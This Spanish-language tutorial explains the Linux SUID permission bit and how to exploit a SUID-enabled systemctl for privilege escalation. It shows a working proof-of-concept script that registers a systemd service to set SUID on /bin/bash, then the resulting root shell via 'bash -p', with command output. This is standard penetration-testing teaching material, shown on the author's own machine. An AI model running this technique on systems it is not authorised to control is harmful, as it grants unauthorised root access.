# Explotación Permisos SUID

Cuando en un binario o fichero el bit SUID está activado significa que la persona que lo ejecute va a tener los mismos permisos que la persona que lo creó. Es decir, si lo creó root tendremos permisos **root**.

Para asignar un permiso **SUID** a un archivo o binario se utiliza el comando _**chmod**_ añadiéndole un 4 al principio de los permisos que deseamos.

Por ejemplo, si miramos la ruta absoluta del binario systemctl _**/usr/bin/systemctl**_ y miramos los permisos de ese binario:

```bash
rwxr-xr-x 1 root root 1058096 abr 12 20:21 /usr/bin/systemctl
```

Podemos ver que tiene el permiso **«**_**755″**_ pues si le añadimos un 4, es decir, _**4755**_ estaríamos activando los permisos SUID en ese binario.

Y si ahora volvemos a mirar los permisos:

```bash
rwsr-xr-x 1 root root 1058096 abr 12 20:21 /usr/bin/systemctl
```

Vemos que se ha activado un nuevo indicador una _**«s».**_

Podemos buscar en el sistema todos los binarios o archivos que tienen permisos SUID mediante el siguiente comando:

```bash
find / -perm -4000 2>/dev/null
```

### POC (systemctl)

```bash
$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/bin/systemctl
/usr/bin/sudo
/usr/bin/su
```

Como vemos, el binario recientemente modificado (systemctl) se encuentra en la lista.

Este tipo de permisos, en ocasiones, pueden ser explotados para escalar privilegios. Por ejemplo, en este caso, podemos escalar privilegios y llegar a ser root. Si buscamos en la página GTFObins podemos ver que para el binario systemctl hay una posible **explotación** de permisos SUID ([https://gtfobins.github.io/gtfobins/systemctl/](https://gtfobins.github.io/gtfobins/systemctl/)).

En nuestro caso, vamos a modificar los permisos del binario _**/bin/bash**_ para poder ejecutar una instancia de la misma como root. El script modificado sería:

```bash
#!/bin/bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

Ejecutamos el script:

```bash
$ ./script
Created symlink /etc/systemd/system/tmp.qRdofPv7gk.service → /tmp/tmp.qRdofPv7gk.service.
Created symlink /etc/systemd/system/multi-user.target.wants/tmp.qRdofPv7gk.service → /tmp/tmp.qRdofPv7gk.service.
```

Si miramos los permisos del binario bash podemos ver cómo han sido modificados:

```bash
$ which bash | xargs ls -la
-rwsr-sr-x 1 root root 1234376 feb 24 21:53 /usr/bin/bash
```

Por lo que ahora, podríamos ejecutar una bash con máximos privilegios:

```bash
$ bash -p
bash-5.1# whoami
root
bash-5.1# id
uid=1000(diegoaltf4) gid=1000(diegoaltf4) euid=0(root) egid=0(root) grupos=0(root),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),121(wireshark),135(scanner),146(kaboxer),1000(diegoaltf4)
```

